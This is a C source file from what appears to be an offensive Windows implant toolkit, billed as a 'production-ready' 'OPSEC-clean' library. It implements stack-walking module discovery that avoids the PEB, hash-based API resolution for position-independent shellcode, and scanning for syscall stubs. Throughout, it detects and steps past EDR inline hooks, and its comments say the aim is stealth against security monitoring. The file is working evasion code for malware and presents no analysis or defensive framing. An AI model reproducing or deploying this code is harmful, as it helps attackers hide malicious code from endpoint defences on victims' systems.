/*
 * BM-T1002 Moonwalk - OPSEC-Clean Implementation
 * 
 * Stack-based module discovery without PEB walk.
 * Production-ready library with no revealing strings.
 */

#include "moonwalk.h"
#include <winnt.h>
#include <string.h>
#include <excpt.h>

#if defined(TEMPEST_PIC_SHELLCODE)
#include "loader.h"
#include <winternl.h>
#endif

// Minimal TEB/NT_TIB view - we only need StackBase/StackLimit
typedef struct _NT_TIB64_MIN {
    PVOID ExceptionList;
    PVOID StackBase;
    PVOID StackLimit;
} NT_TIB64_MIN, *PNT_TIB64_MIN;

#if defined(TEMPEST_PIC_SHELLCODE)
/* FNV-1a("ntdll.dll") / FNV-1a("NtQueryVirtualMemory") — EAT path, no IAT */
#  define H_MW_NTDLL              0x1617909Fu
#  define H_MW_NTQUERYVIRTUAL     0x03BD7203u
typedef NTSTATUS (NTAPI *mw_NtQueryVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    ULONG MemoryInformationClass,
    PVOID MemoryInformation,
    SIZE_T MemoryInformationLength,
    PSIZE_T ReturnLength);
static mw_NtQueryVirtualMemory_t g_mw_pNtQVM = NULL;
static int mw_ensure_nqvm(void) {
    if (g_mw_pNtQVM) return 1;
    HMODULE n = (HMODULE)locate_base(H_MW_NTDLL);
    if (!n) return 0;
    g_mw_pNtQVM = (mw_NtQueryVirtualMemory_t)(void *)resolve_addr(n, H_MW_NTQUERYVIRTUAL);
    return g_mw_pNtQVM != NULL;
}
#endif

// Check if memory is readable
static int is_memory_readable(const void *addr, size_t len) {
    (void)len;
    MEMORY_BASIC_INFORMATION mbi;
#if defined(TEMPEST_PIC_SHELLCODE)
    if (!mw_ensure_nqvm() || !g_mw_pNtQVM) return 0;
    SIZE_T ret = 0;
    if (g_mw_pNtQVM((HANDLE)(ULONG_PTR)(LONG_PTR)-1, (PVOID)addr, 0, &mbi, sizeof(mbi), &ret) < 0)
        return 0;
#else
    if (VirtualQuery(addr, &mbi, sizeof(mbi)) != sizeof(mbi)) return 0;
#endif
    if (mbi.State != MEM_COMMIT) return 0;
    if (!(mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | 
                         PAGE_READONLY | PAGE_READWRITE))) return 0;
    return 1;
}

// Validate PE64 (x64) DLL at candidate base address
static int is_pe64_dll(unsigned char *base) {
    if (!is_memory_readable(base, sizeof(IMAGE_DOS_HEADER))) return 0;
    
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    
    if (!is_memory_readable(base + dos->e_lfanew, sizeof(IMAGE_NT_HEADERS))) return 0;
    
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return 0;
    if ((nt->FileHeader.Characteristics & IMAGE_FILE_DLL) == 0) return 0;
    
    return 1;
}

// Case-insensitive wide string comparison, ignoring .dll extension
static int wide_name_equals(unsigned char *module_base, const wchar_t *target_name) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)module_base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)(module_base + dos->e_lfanew);
    
    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!export_rva) return 0;
    
    if (!is_memory_readable(module_base + export_rva, sizeof(IMAGE_EXPORT_DIRECTORY))) return 0;
    
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY*)(module_base + export_rva);
    if (exp->Name == 0) return 0;
    
    if (!is_memory_readable(module_base + exp->Name, 64)) return 0;
    
    const char *ansi_name = (const char*)(module_base + exp->Name);
    
    // Convert wide target_name to ANSI manually (NO WideCharToMultiByte API call)
    // DLL names are ASCII-only, so simple truncation is correct.
    char target_ansi[260] = {0};
    for (int i = 0; target_name[i] && i < 259; i++)
        target_ansi[i] = (char)(target_name[i] & 0xFF);
    
    // Strip .dll extension from both names
    char mod_buf[260] = {0};
    strncpy(mod_buf, ansi_name, sizeof(mod_buf)-1);
    mod_buf[sizeof(mod_buf)-1] = '\0';
    char *dot = strrchr(mod_buf, '.');
    if (dot) *dot = '\0';
    
    char tgt_buf[260] = {0};
    strncpy(tgt_buf, target_ansi, sizeof(tgt_buf)-1);
    tgt_buf[sizeof(tgt_buf)-1] = '\0';
    dot = strrchr(tgt_buf, '.');
    if (dot) *dot = '\0';
    
    // Manual case-insensitive compare (NO _stricmp / MSVC runtime dependency)
    for (int i = 0; ; i++) {
        char a = mod_buf[i], b = tgt_buf[i];
        if (a >= 'A' && a <= 'Z') a += 32;
        if (b >= 'A' && b <= 'Z') b += 32;
        if (a != b) return 0;
        if (a == '\0') return 1; /* both ended, all matched */
    }
}

HMODULE find_module_base(const wchar_t *dll_name) {
    if (!dll_name) return NULL;
    
#ifdef _WIN64
    // Read TEB from GS segment register (GS:[0x30] on x64)
    PNT_TIB64_MIN tib = (PNT_TIB64_MIN)__readgsqword(0x30);
#else
    // x86 not supported - focus on x64 only
    return NULL;
#endif
    
    unsigned char *stack_lo = (unsigned char*)tib->StackLimit;
    unsigned char *stack_hi = (unsigned char*)tib->StackBase;
    (void)stack_lo;  /* reserved for future stack-bound validation */
    
    // Walk stack from current position to stack base
    unsigned char *current_sp = (unsigned char*)&dll_name;
    
    for (unsigned char *p = current_sp; p < stack_hi; p += sizeof(void*)) {
        // Check if this stack location is readable
        if (!is_memory_readable(p, sizeof(void*))) continue;
        
        // Read potential return address from stack
        unsigned char *ret_addr = *(unsigned char**)p;
        if (!ret_addr) continue;
        
        // Align to page boundary (4KB = 0x1000)
        unsigned char *page_aligned = (unsigned char*)((ULONG_PTR)ret_addr & ~0xFFFULL);
        
        // Scan backwards up to 1MB looking for PE header
        for (int back_offset = 0; back_offset < 0x100000; back_offset += 0x1000) {
            unsigned char *candidate_base = page_aligned - back_offset;
            if (!candidate_base) break;
            
            // Check if this is a valid PE64 DLL
            if (is_pe64_dll(candidate_base)) {
                // Check if module name matches target
                if (wide_name_equals(candidate_base, dll_name)) {
                    return (HMODULE)candidate_base;
                }
            }
        }
    }
    
    return NULL;
}

void* resolve_export(HMODULE module_base, const char *func_name) {
    if (!module_base || !func_name) return NULL;
    
    unsigned char *base = (unsigned char*)module_base;
    
    if (!is_memory_readable(base, sizeof(IMAGE_DOS_HEADER))) return NULL;
    
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    
    if (!is_memory_readable(base + dos->e_lfanew, sizeof(IMAGE_NT_HEADERS))) return NULL;
    
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    
    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!export_rva) return NULL;
    
    if (!is_memory_readable(base + export_rva, sizeof(IMAGE_EXPORT_DIRECTORY))) return NULL;
    
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY*)(base + export_rva);
    
    DWORD *name_rvas = (DWORD*)(base + exp->AddressOfNames);
    WORD  *name_ords = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD *func_rvas = (DWORD*)(base + exp->AddressOfFunctions);
    
    // Search export name table
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        if (!is_memory_readable(base + name_rvas[i], 64)) continue;
        
        const char *export_name = (const char*)(base + name_rvas[i]);
        
        if (strcmp(export_name, func_name) == 0) {
            WORD ordinal = name_ords[i];
            DWORD func_rva = func_rvas[ordinal];
            
            // Note: This does not handle forwarded exports
            // Forwarded exports have RVA pointing inside the export directory
            // For production use, check if func_rva is within export directory range
            
            return (void*)(base + func_rva);
        }
    }
    
    return NULL;
}

/*
 * scan_for_pattern
 * 
 * Scans memory region for a byte pattern, avoiding EAT enumeration entirely.
 * This is the Stargate/Moonwalk enhancement - find functions by signature instead of name.
 * 
 * Parameters:
 *   module_base: Base address of module to scan
 *   pattern:     Byte pattern to search for
 *   pattern_len: Length of pattern in bytes
 *   scan_size:   How many bytes to scan (typically 1-2MB for ntdll)
 * 
 * Returns:
 *   Address of first match, or NULL if not found
 * 
 * OPSEC Notes:
 *   - More stealthy than EAT enumeration (no name table access)
 *   - Requires known function signatures (prepare offline)
 *   - Resilient to hooks (can skip hooked prologue and find real body)
 */
void* scan_for_pattern(HMODULE module_base, const unsigned char *pattern, size_t pattern_len, size_t scan_size) {
    if (!module_base || !pattern || pattern_len == 0) return NULL;
    
    unsigned char *base = (unsigned char*)module_base;
    
    // Strategy 1: Try exact match first
    for (size_t offset = 0; offset < scan_size; offset += 0x1000) {
        if (!is_memory_readable(base + offset, 0x1000)) continue;
        
        for (size_t i = 0; i < 0x1000 - pattern_len; ++i) {
            if (memcmp(base + offset + i, pattern, pattern_len) == 0) {
                return (void*)(base + offset + i);
            }
        }
    }
    
    // Strategy 2: Fuzzy match on first 16 bytes (allowing for relocations)
    // NT functions have stable patterns: first few bytes are typically MOV instructions
    if (pattern_len >= 16) {
        for (size_t offset = 0; offset < scan_size; offset += 0x1000) {
            if (!is_memory_readable(base + offset, 0x1000)) continue;
            
            for (size_t i = 0; i < 0x1000 - pattern_len; ++i) {
                unsigned char *candidate = base + offset + i;
                
                // Count matching bytes in first 16
                int matches = 0;
                for (size_t j = 0; j < 16; ++j) {
                    if (candidate[j] == pattern[j]) matches++;
                }
                
                // If 12+ out of 16 bytes match, likely the same function
                if (matches >= 12) {
                    return (void*)candidate;
                }
            }
        }
    }
    
    // Strategy 3: Look for NT syscall stub pattern specifically
    // NT stubs have format: MOV R10, RCX; MOV EAX, <ssn>; SYSCALL; RET
    // Pattern: 4C 8B D1 B8 ?? ?? ?? ?? 0F 05 C3
    if (pattern_len >= 11) {
        unsigned char syscall_pattern[] = {0x4C, 0x8B, 0xD1, 0xB8};
        
        for (size_t offset = 0; offset < scan_size; offset += 0x1000) {
            if (!is_memory_readable(base + offset, 0x1000)) continue;
            
            for (size_t i = 0; i < 0x1000 - 11; ++i) {
                unsigned char *candidate = base + offset + i;
                
                // Check for syscall stub pattern
                if (memcmp(candidate, syscall_pattern, 4) == 0 &&
                    candidate[8] == 0x0F && candidate[9] == 0x05 && candidate[10] == 0xC3) {
                    
                    // Found a syscall stub - verify it matches the expected signature roughly
                    int sig_matches = 0;
                    for (size_t j = 0; j < (pattern_len < 16 ? pattern_len : 16); ++j) {
                        if (candidate[j] == pattern[j]) sig_matches++;
                    }
                    
                    // If at least 50% of first 16 bytes match, accept it
                    if (sig_matches >= 8) {
                        return (void*)candidate;
                    }
                }
            }
        }
    }
    
    return NULL;
}

// Detect specific hook patterns
static HOOK_TYPE detect_hook_type(const unsigned char *mem, const unsigned char *clean, size_t len) {
    if (len < 5) return HOOK_NONE;
    
    // JMP rel32: E9 xx xx xx xx
    if (mem[0] == 0xE9 && clean[0] != 0xE9) {
        return HOOK_JMP_REL32;
    }
    
    // JMP rel8: EB xx
    if (mem[0] == 0xEB && clean[0] != 0xEB) {
        return HOOK_JMP_REL8;
    }
    
    // CALL rel32: E8 xx xx xx xx
    if (mem[0] == 0xE8 && clean[0] != 0xE8) {
        return HOOK_CALL_REL32;
    }
    
    if (len >= 6) {
        // PUSH imm32; RET: 68 xx xx xx xx C3
        if (mem[0] == 0x68 && mem[5] == 0xC3 && 
            (clean[0] != 0x68 || clean[5] != 0xC3)) {
            return HOOK_PUSH_RET;
        }
    }
    
    if (len >= 12) {
        // MOV RAX, imm64; JMP RAX: 48 B8 ... FF E0
        if (mem[0] == 0x48 && mem[1] == 0xB8 && mem[10] == 0xFF && mem[11] == 0xE0 &&
            (clean[0] != 0x48 || clean[1] != 0xB8)) {
            return HOOK_MOV_JMP;
        }
    }
    
    // Inline modification (bytes changed but not obvious pattern)
    for (size_t i = 0; i < (len < 16 ? len : 16); ++i) {
        if (mem[i] != clean[i]) {
            return HOOK_INLINE;
        }
    }
    
    return HOOK_NONE;
}

// Calculate match ratio (skip first N bytes if hooked)
static float calc_match_ratio(const unsigned char *mem, const unsigned char *clean, size_t len, size_t skip) {
    if (len <= skip) return 0.0f;
    size_t matches = 0;
    for (size_t i = skip; i < len; ++i) {
        if (mem[i] == clean[i]) matches++;
    }
    return (float)matches / (float)(len - skip);
}

void* scan_with_hook_detection(
    HMODULE module_base,
    const unsigned char *clean_sig,
    size_t sig_len,
    size_t scan_size,
    HOOK_INFO *hook_info
) {
    if (!module_base || !clean_sig || sig_len == 0) return NULL;

    // Initialize hook_info
    if (hook_info) {
        memset(hook_info, 0, sizeof(HOOK_INFO));
    }
    
    // Strategy 1: Try exact match first (no hook)
    void *exact = scan_for_pattern(module_base, clean_sig, sig_len, scan_size);
    if (exact) {
        if (hook_info) {
            hook_info->is_hooked = 0;
            hook_info->match_ratio = 1.0f;
        }
        return exact;
    }
    
    // Strategy 2: Partial match (prologue hooked, body intact)
    // Scan for signature starting at offset 8 (skip typical 5-byte JMP hook)
    if (sig_len > 16) {
        void *partial = scan_for_pattern(module_base, clean_sig + 8, sig_len - 8, scan_size);
        if (partial) {
            // Found body - back up 8 bytes to get function start
            unsigned char *func_start = (unsigned char*)partial - 8;
            
            if (is_memory_readable(func_start, sig_len)) {
                // Verify this looks like a hook
                HOOK_TYPE hook_type = detect_hook_type(func_start, clean_sig, sig_len);
                
                if (hook_type != HOOK_NONE && hook_info) {
                    hook_info->is_hooked = 1;
                    hook_info->hook_type = hook_type;
                    hook_info->hook_offset = 0;
                    hook_info->bytes_len = sig_len < 24 ? sig_len : 24;
                    memcpy(hook_info->original_bytes, clean_sig, hook_info->bytes_len);
                    memcpy(hook_info->hooked_bytes, func_start, hook_info->bytes_len);
                    hook_info->match_ratio = calc_match_ratio(func_start, clean_sig, sig_len, 8);
                    
                    // Extract jump target if applicable
                    if (hook_type == HOOK_JMP_REL32) {
                        int rel = *(int*)(func_start + 1);
                        hook_info->jump_target = (void*)(func_start + 5 + rel);
                    } else if (hook_type == HOOK_CALL_REL32) {
                        int rel = *(int*)(func_start + 1);
                        hook_info->jump_target = (void*)(func_start + 5 + rel);
                    } else if (hook_type == HOOK_PUSH_RET) {
                        hook_info->jump_target = *(void**)(func_start + 1);
                    } else if (hook_type == HOOK_MOV_JMP) {
                        hook_info->jump_target = *(void**)(func_start + 2);
                    }
                }
                
                return (void*)func_start;
            }
        }
    }
    
    // Strategy 3: Scan for body signature (deeper into function)
    // Use bytes 24-40 as signature (typically past any hook)
    if (sig_len >= 40) {
        void *body = scan_for_pattern(module_base, clean_sig + 24, 16, scan_size);
        if (body) {
            unsigned char *func_start = (unsigned char*)body - 24;
            
            if (is_memory_readable(func_start, sig_len)) {
                if (hook_info) {
                    hook_info->is_hooked = 1;
                    hook_info->hook_type = detect_hook_type(func_start, clean_sig, sig_len);
                    hook_info->hook_offset = 0;
                    hook_info->bytes_len = sig_len < 24 ? sig_len : 24;
                    memcpy(hook_info->original_bytes, clean_sig, hook_info->bytes_len);
                    memcpy(hook_info->hooked_bytes, func_start, hook_info->bytes_len);
                    hook_info->match_ratio = calc_match_ratio(func_start, clean_sig, sig_len, 24);
                }
                
                return (void*)func_start;
            }
        }
    }
    
    return NULL;
}

